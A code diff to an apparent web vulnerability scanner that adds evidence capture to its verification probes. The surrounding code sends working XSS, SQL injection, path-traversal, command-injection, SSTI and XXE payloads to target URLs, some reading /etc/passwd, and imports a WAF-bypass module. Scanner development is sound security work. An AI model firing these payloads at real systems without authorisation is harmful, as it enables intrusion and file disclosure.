@@ -6,6 +6,7 @@ import time
 import random
 from typing import List, Dict, Optional
 from urllib.parse import quote, urlencode, urlsplit, urlunsplit, parse_qsl, urlparse
+from core.audit import EVIDENCE_CAP
 from core.async_network import AsyncNetworkEngine
 from core.ui import B, C, G, N, R, W, Y, i, p, s, w
 from modules.auth.bypass import WAFBypass
@@ -498,6 +499,17 @@ class VulnVerifier:
     RCE_MARKERS = [r"uid=\d+\(\w+\)", r"gid=\d+\(\w+\)", r"www-data", r"nt authority\\system"]
 
     @staticmethod
+    def _probe_ok(cond, probe, finding: Dict) -> bool:
+        """Wrap a probe verdict: when it confirms, stash the scan-time
+        response body on the finding as report evidence (capped, once)."""
+        if cond and isinstance(probe, dict) and not finding.get("evidence"):
+            body = probe.get("body") or ""
+            if body:
+                finding["evidence"] = body[:EVIDENCE_CAP]
+                finding["verified_url"] = probe.get("url") or ""
+        return bool(cond)
+
+    @staticmethod
     def _with_payload(url: str, payload: str) -> str:
         parts = urlsplit(url)
         query = parse_qsl(parts.query, keep_blank_values=True)
@@ -531,29 +543,39 @@ class VulnVerifier:
             proof = "<svg/onload=confirm(1)>"
             r = await engine.ahttp_send(VulnVerifier._with_payload(url, proof), state_context=session_manager)
             body = r.get("body", "")
-            return r["status"] > 0 and proof in body
+            return VulnVerifier._probe_ok(r["status"] > 0 and proof in body, r, finding)
 
         elif "sqli" in vtype:
             if vtype == "sqli_time":
                 baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "1"), timeout=12, state_context=session_manager)
                 delayed = await engine.ahttp_send(VulnVerifier._with_payload(url, "' AND SLEEP(5)-- -"), timeout=15, state_context=session_manager)
-                return delayed.get("time", 0) - baseline.get("time", 0) >= 4
+                return VulnVerifier._probe_ok(
+                    delayed.get("time", 0) - baseline.get("time", 0) >= 4,
+                    delayed, finding)
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "'"), timeout=12, state_context=session_manager)
-            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.SQL_ERRORS)
+            return VulnVerifier._probe_ok(
+                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.SQL_ERRORS),
+                probe, finding)
 
         elif vtype == "lfi":
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "../../../../etc/passwd"), timeout=12, state_context=session_manager)
-            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.LFI_MARKERS)
+            return VulnVerifier._probe_ok(
+                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.LFI_MARKERS),
+                probe, finding)
 
         elif vtype == "rce":
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "; id;"), timeout=12, state_context=session_manager)
-            return probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.RCE_MARKERS)
+            return VulnVerifier._probe_ok(
+                probe["status"] > 0 and VulnVerifier._body_has_any(probe.get("body", ""), VulnVerifier.RCE_MARKERS),
+                probe, finding)
 
         elif vtype == "ssti":
             baseline = await engine.ahttp_send(VulnVerifier._with_payload(url, "verd_verify"), timeout=12, state_context=session_manager)
             probe = await engine.ahttp_send(VulnVerifier._with_payload(url, "{{1337*7331}}"), timeout=12, state_context=session_manager)
             expected = "9801547"
-            return probe["status"] > 0 and expected in probe.get("body", "") and expected not in baseline.get("body", "")
+            return VulnVerifier._probe_ok(
+                probe["status"] > 0 and expected in probe.get("body", "") and expected not in baseline.get("body", ""),
+                probe, finding)
 
         elif vtype == "xxe_file":
             if not allow_post:
@@ -562,17 +584,23 @@ class VulnVerifier:
                 return finding.get("confidence") == "confirmed"
             payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
             probe = await engine.ahttp_send(url, method="POST", data=payload, headers={"Content-Type": "text/xml"}, timeout=12, state_context=session_manager)
-            return probe["status"] > 0 and "root:x:0:0:" in probe.get("body", "")
+            return VulnVerifier._probe_ok(
+                probe["status"] > 0 and "root:x:0:0:" in probe.get("body", ""),
+                probe, finding)
 
         elif vtype == "open_redirect":
             probe = await engine.ahttp_send(url, timeout=12, state_context=session_manager)
             location = probe.get("headers", {}).get("location", "")
-            return probe["status"] in (301, 302, 303, 307, 308) and any(c in location for c in ["google.com", "example.com"])
+            return VulnVerifier._probe_ok(
+                probe["status"] in (301, 302, 303, 307, 308) and any(c in location for c in ["google.com", "example.com"]),
+                probe, finding)
 
         elif vtype == "cors_misconfig":
             probe = await engine.ahttp_send(url, headers={"Origin": "https://evil.com"}, timeout=12, state_context=session_manager)
             headers = probe.get("headers", {})
-            return headers.get("access-control-allow-origin") == "https://evil.com"
+            return VulnVerifier._probe_ok(
+                headers.get("access-control-allow-origin") == "https://evil.com",
+                probe, finding)
 
         elif vtype in {"auth_bypass", "http_smuggling"}:
             return finding.get("confidence") == "confirmed"
